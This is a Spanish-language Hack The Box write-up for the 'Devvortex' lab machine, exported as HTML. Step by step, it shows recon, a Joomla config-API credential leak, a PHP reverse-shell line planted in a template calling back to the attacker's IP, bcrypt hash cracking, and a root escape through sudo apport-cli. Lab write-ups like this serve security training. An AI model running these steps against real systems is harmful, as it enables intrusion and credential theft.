@@ -1,0 +1,322 @@
+<!DOCTYPE html><html><head>
+      <title>devvortex</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      
+      <link rel="stylesheet" href="file:///c:\Users\Oscar\.vscode\extensions\shd101wyy.markdown-preview-enhanced-0.8.18\crossnote\dependencies\katex\katex.min.css">
+      
+      
+      
+      
+      
+<style>
+
+body {
+  background-color: #121212; 
+  color: #f5f5f5;
+  font-family: monospace; 
+  line-height: 1.6;
+  padding: 20px;
+  font-size: 15px;
+}
+
+a {
+  color: #66ffcc;
+  text-decoration: none;
+}
+a:hover {
+  text-decoration: underline;
+}
+
+h1, h2, h3 {
+  color: #ffffff;
+}
+
+pre {
+  background-color: #1e1e1e;
+  color: #00ff00; 
+  padding: 10px;
+  border-radius: 5px;
+  overflow-x: auto;
+}
+
+code {
+  background-color: #1e1e1e;
+  color: #00ff00; 
+  padding: 2px 5px;
+  border-radius: 3px;
+}
+
+img {
+  max-width: 900px;
+  width: 100%;
+  height: auto;
+  display: block;
+  margin: 20px auto;
+}
+
+
+
+
+
+</style>
+
+
+</script></head><body for="html-export">
+    
+    
+      <div class="crossnote markdown-preview  ">
+      
+<hr>
+<p>Hack The Box</p>
+<p>Maquina: Devvortex</p>
+<p>Objetivo: Un sistema operativo Linux con una vulnerabilidad en una aplicación web que lleva al escalamiento de privilegios.</p>
+<p>Dificultad: Facil</p>
+<hr>
+<h2 id="escaneo">Escaneo </h2>
+<p>Fase 1: Escaneo de puertos</p>
+<p>Con nuestra herramienta nmap haremos un escaneo con la ip que nos proporciona htb para ver que puertos tiene abiertos y esta utilizando la maquina.</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>$ nmap -sV 10.10.11.242   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-18 03:41 CEST
+Nmap scan report for 10.10.11.242
+Host is up (0.050s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.72 seconds
+
+</code></pre><p>Nos indica que esta utilizando el puerto 80, eso significa que la maquina tiene abierta una pagina web que ella misma esta siendo usada de servidor, si utilizamos la direccion ip como url en nuestro navegador podremos verla.<br>
+Tambien esta utilizando el 22, eso significa que tiene activo el servicio ssh.</p>
+<p>Antes de seguir usaremos este comando de abajo para meter la pagina en nuestro archivos de hosts por que esta maquina tiene el dominio que está en la red de la vpn.<br>
+Nos pedira la contraseña al introducir el comando, ya que el archivo hosts necesita permisos de root.</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>$ echo "10.10.11.242 devvortex.htb" | sudo tee -a /etc/hosts
+[sudo] contraseña para pingu: 
+10.10.11.242 devvortex.htb
+</code></pre><p>Y AHORA SI!<br>
+<img src="../../public/devvortex/paginadevvortex.jpg" alt="Branching"></p>
+<p>Ahora utilizaremos la herramienta gobuster para descubrir los directorios de la pagina web y efectivamente tenemos tres : Images,css y js.</p>
+<p>Para utilizarla necesitamos indicarle en el comando que diccionario utilizar, yo los tengo en el directorio : /home/pingu/Escritorio/Diccionarios pero suelen estar en : /usr/share/wordlists</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>$ gobuster dir -u http://devvortex.htb/ -w /home/pingu/Escritorio/Diccionarios/directory-list-lowercase-2.3-medium.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://devvortex.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/pingu/Escritorio/Diccionarios/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 178] [--&gt; http://devvortex.htb/images/]
+/css                  (Status: 301) [Size: 178] [--&gt; http://devvortex.htb/css/]
+/js                   (Status: 301) [Size: 178] [--&gt; http://devvortex.htb/js/]
+Progress: 207643 / 207644 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+</code></pre><p>Tambien haremos lo mismo con gobuster pero con los DNS.</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>gobuster dns <span class="token parameter variable">-d</span> devvortex.htb <span class="token parameter variable">-w</span> /home/pingu/Escritorio/Diccionarios/common.txt 
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Gobuster v3.6
+by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Domain:     devvortex.htb
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:    <span class="token number">10</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:    1s
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:   /home/pingu/Escritorio/Diccionarios/common.txt
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Starting gobuster <span class="token keyword keyword-in">in</span> DNS enumeration mode
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+Found: dev.devvortex.htb
+
+
+</code></pre><p>Y tambien lo añadiremos a nuestro archivo de hosts la nueva url que ha encontrado.</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>echo “10.10.11.242 dev.devvortex.htb” | sudo tee –a /etc/hosts
+</code></pre><p>Volveremos a usar la herramienta gobuster con esta nueva direccion haber que encontramos, usando de nuevo el mismo diccionario.</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>gobuster dir -u dev.devvortex.htb -w /home/pingu/Escritorio/Diccionarios/common.txt
+</code></pre><p>Si entramos en la nueva direccion que nos ha dado gobuster veremos la otra web y en el directorio /robots.txt veremos otros directorios donde nos podemos meter.<br>
+<img src="../../public/devvortex/robots.JPG" alt="Branching"></p>
+<p>LA que nos interesa es "administrador" asi que lo ponemos en nuestra barra de navegador quedando asi : <a href="http://dev.devvortex.htb/administrator/">http://dev.devvortex.htb/administrator/</a> y veremos un subdominio para loguear con una cuenta<br>
+<img src="../../public/devvortex/administrador.jpg" alt="Branching"></p>
+<p>Si no fijamos esta hecha en la plataforma Joomla, haciendo una busqueda por internet podemos encontrar una vulnerabilidad en joombla</p>
+<p><a href="https://vulncheck.com/blog/joomla-for-rce">https://vulncheck.com/blog/joomla-for-rce</a></p>
+<p>Utilizando el comando siguiente podremos enonctrar un usuario y una contraseña</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true | jq
+
+  "type": "application",
+      "id": "224",
+      "attributes": {
+        "user": "lewis",
+        "id": 224
+      }
+    },
+    {
+      "type": "application",
+      "id": "224",
+      "attributes": {
+        "password": "P4ntherg0t1n5r3c0n##",
+        "id": 224
+
+</code></pre><p>user: lewis<br>
+password: P4ntherg0t1n5r3c0n##</p>
+<p>Pues si nos vamos al login de joomla de antes y introducimos el usuario y la contraseña que hemos descubierto podremos entrar.</p>
+<p><img src="../../public/devvortex/lewis.jpg" alt="Branching"><br>
+<img src="../../public/devvortex/dashboard.jpg" alt="Branching"></p>
+<p>Ahora chafardeando un poco nos metemos en System, luego en administrador templates y en  	Atum Details and Files y a la izquierda veremos muchos archivos .php y el que nos interesa es el "index.php que nos deja editarlo y le meteremos nuestro codigo en la segunda linea y poniendo nuestra ip.</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.44/4444 0&gt;&amp;1'");
+</code></pre><p>Nos pondremos en "escucha" por el puerto 4444 con el codigo</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>nc -lvnp 4444
+</code></pre><p>Guardaremos el archivo .php dandole a save arriba y....</p>
+<p>PUM! estamos dentro!<br>
+<img src="../../public/devvortex/dentro.JPG" alt="Branching"></p>
+<p>Usaremos estos comandos en el mismo orden para poner bien la terminal.</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>script /dev/null -c /bin/bash
+
+stty raw -echo; fg
+export TERM=xterm
+</code></pre><p>Y empezaremos con el mysql, introduciendo el usuario y la contraseña que ya teniamos de antes.</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>mysql -u lewis -p
+
+Contraseña: P4ntherg0t1n5r3c0n##
+</code></pre><p>Una vez dentro introduciremos los comandos y podremos ver la tabla con dos usuarios y sus contraseñas</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>mysql&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| joomla             |
+| performance_schema |
++--------------------+
+3 rows in set (0.00 sec)
+
+mysql&gt; use joomla;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; select username,password from sd4fg_users;
++----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
+| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
++----------+--------------------------------------------------------------+
+2 rows in set (0.00 sec)
+</code></pre><p>Guardaremos el codigo de logan en un archivo de texto y con john the ripper lo usaremos para descifrar la contraseña.</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tequieromucho    (?)     
+1g 0:00:00:15 DONE (2024-04-18 23:44) 0.06337g/s 88.97p/s 88.97c/s 88.97C/s iceman..harry
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre><p>Nos conectaremos por ssh con la contraseña y leeremos el archivo que hay para tener la primera flag.</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>ssh logan@10.10.11.242   
+</code></pre><pre data-role="codeBlock" data-info="" class="language-text"><code>logan@devvortex:~$ ls
+user.txt
+logan@devvortex:~$ cat user.txt
+4bfa612fe7cd925d3dea39d58e477fce
+logan@devvortex:~$ 
+</code></pre><p>ESCALAR PRIVILEGIOS DE LOGAN A ROOT</p>
+<p>Ahora que somos el usuario logan, debemos escalar a root para tener el control total de la maquina, haciendo "sudo -l" nos daremos cuenta que podemos ejecutar "apport-cli" con permisos de sudo</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>sudo /usr/bin/apport-cli -f
+</code></pre><p>E iremos siguiendo los pasos, le indicaremos que queremos ver el informe con las respuestas : 1,2 y v.</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>*** What kind of problem do you want to report?
+
+
+Choices:
+  1: Display (X.org)
+  2: External or internal storage devices (e. g. USB sticks)
+  3: Security related problems
+  4: Sound/audio related problems
+  5: dist-upgrade
+  6: installation
+  7: installer
+  8: release-upgrade
+  9: ubuntu-release-upgrader
+  10: Other problem
+  C: Cancel
+Please choose (1/2/3/4/5/6/7/8/9/10/C): 1
+
+
+*** Collecting problem information
+
+The collected information can be sent to the developers to improve the
+application. This might take a few minutes.
+
+*** What display problem do you observe?
+
+
+Choices:
+  1: I don't know
+  2: Freezes or hangs during boot or usage
+  3: Crashes or restarts back to login screen
+  4: Resolution is incorrect
+  5: Shows screen corruption
+  6: Performance is worse than expected
+  7: Fonts are the wrong size
+  8: Other display-related problem
+  C: Cancel
+Please choose (1/2/3/4/5/6/7/8/C): 2
+
+*** 
+
+To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze
+
+Press any key to continue... 
+
+...dpkg-query: no packages found matching xorg
+...................
+
+*** Send problem report to the developers?
+
+After the problem report has been sent, please fill out the form in the
+automatically opened web browser.
+
+What would you like to do? Your options are:
+  S: Send report (1.4 KB)
+  V: View report
+  K: Keep report file for sending later or copying to somewhere else
+  I: Cancel and ignore future crashes of this program version
+  C: Cancel
+Please choose (S/V/K/I/C): v
+</code></pre><p>Cuando termine el proceso veremos unos " : " al final, es entonces cuando tendremos que indicarle que queremos usar la bash escribiendo el comando</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>!/bin/bash
+</code></pre><p>y Estaremos en ROOT!</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>root@devvortex:/home/logan# cd ..
+root@devvortex:/home# ls
+logan
+root@devvortex:/home# cd ..
+root@devvortex:/# ls
+bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+root@devvortex:/# cd root
+root@devvortex:~# ls
+root.txt
+root@devvortex:~# cat root.txt
+25d8433417d6a35802076badf2ba1f13
+root@devvortex:~# 
+</code></pre><p>Y hasta aqui mi primera writeup de la maquina devvortex! Ha sido un placer ser root de esta fantasttica maquina!</p>
+
+      </div>
+      
+      
+    
+    
+    
+    
+    
+    
+  
+    </body></html>
